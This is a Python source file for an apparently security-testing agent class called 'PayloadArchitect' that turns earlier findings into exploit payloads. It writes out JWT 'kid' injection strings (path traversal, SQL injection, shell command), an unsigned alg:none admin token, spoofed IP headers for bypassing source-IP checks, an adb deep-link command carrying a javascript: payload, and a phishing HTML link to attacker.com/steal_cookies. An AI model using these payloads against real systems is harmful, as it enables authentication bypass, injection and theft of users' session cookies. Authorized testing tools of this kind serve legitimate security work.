import json
import os
import requests
from fbh.core.agents.base import BaseAgent
from fbh.database import db
from fbh.logger import logger

class PayloadArchitect(BaseAgent):
    """Generates sophisticated security payloads and exploit vectors"""
    
    @property
    def name(self) -> str:
        return "Payload Architect"
    
    @property
    def description(self) -> str:
        return "Specializes in crafting advanced payloads for JWT, auth bypass, and deep link vulnerabilities."
    
    def run(self):
        """Execute payload generation workflow"""
        if not self.target:
            return
            
        findings = self.target.get_findings()
        if not findings:
            logger.info("No findings available for payload generation")
            return
            
        logger.info(f"Payload Architect analyzing {len(findings)} findings for {self.target.name}")
        
        for finding in findings:
            category = finding.get('category', '').lower()
            
            # Focus on high-value categories
            if any(k in category for k in ['jwt', 'auth', 'deeplink', 'redirect']):
                payload = self._generate_payload(finding)
                if payload:
                    self.add_insight(
                        title=f"Exploit Payload: {finding['title']}",
                        detail=payload,
                        severity='high'
                    )
                    
    def _generate_payload(self, finding: dict) -> str:
        """Core logic to generate a specific payload"""
        category = finding.get('category', '').lower()
        title = finding.get('title', '').lower()
        
        # 1. JWT Payload Generation
        if 'jwt' in category:
            return self._craft_jwt_payload(finding)
            
        # 2. Auth Bypass Payload
        if 'auth' in category or 'ip_bypass' in category:
            return self._craft_auth_bypass_suite(finding)
            
        # 3. Deep Link Exploit
        if 'deeplink' in category:
            return self._craft_deeplink_exploit(finding)
            
        return None

    def _craft_jwt_payload(self, finding: dict) -> str:
        """Generate specific JWT attack vectors"""
        poc = finding.get('poc', '')
        # Check for 'kid'
        if 'kid' in poc or 'Key ID' in finding['title']:
            return (
                "### JWT Key ID (kid) Injection Suite\n"
                "1. Path Traversal: `{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"../../../../dev/null\"}` (Try with null secret)\n"
                "2. SQLi: `{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"' OR 1=1 --\"}`\n"
                "3. Command Injection: `{\"alg\":\"HS256\",\"typ\":\"JWT\",\"kid\":\"/bin/sh -c '...'\"}`"
            )
        
        # Standard None algorithm
        return (
            "### JWT Algorithm Bypass (None)\n"
            "Generate a token with `\"alg\":\"none\"` and remove the signature.\n"
            "Payload Template (Base64URL encoded):\n"
            "`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJuYW1lIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjJ9.`"
        )

    def _craft_auth_bypass_suite(self, finding: dict) -> str:
        """Generate header suite for IP-based bypass"""
        return (
            "### IP Address Control Header Suite\n"
            "Inject the following headers to bypass source-IP restricted endpoints:\n"
            "```http\n"
            "X-Forwarded-For: 127.0.0.1\n"
            "X-Originating-IP: 127.0.0.1\n"
            "X-Real-IP: 127.0.0.1\n"
            "X-Remote-IP: 127.0.0.1\n"
            "X-Client-IP: 127.0.0.1\n"
            "X-Custom-IP-Authorization: 127.0.0.1\n"
            "```"
        )

    def _craft_deeplink_exploit(self, finding: dict) -> str:
        """Generate malicious deep link intent"""
        location = finding.get('location', 'fbh://example')
        return (
            f"### Malicious Intent Payload\n"
            f"Exploit URI: `{location}`\n\n"
            "**ADB Command for testing:**\n"
            f"`adb shell am start -W -a android.intent.action.VIEW -d \"{location}?next=javascript:alert(document.domain)\" {self.target.package_name}`\n\n"
            "**HTML PoC for phish-to-exploit:**\n"
            f"```html\n"
            f"<a href=\"{location}?url=http://attacker.com/steal_cookies\">Click for Free Credits!</a>\n"
            "```"
        )
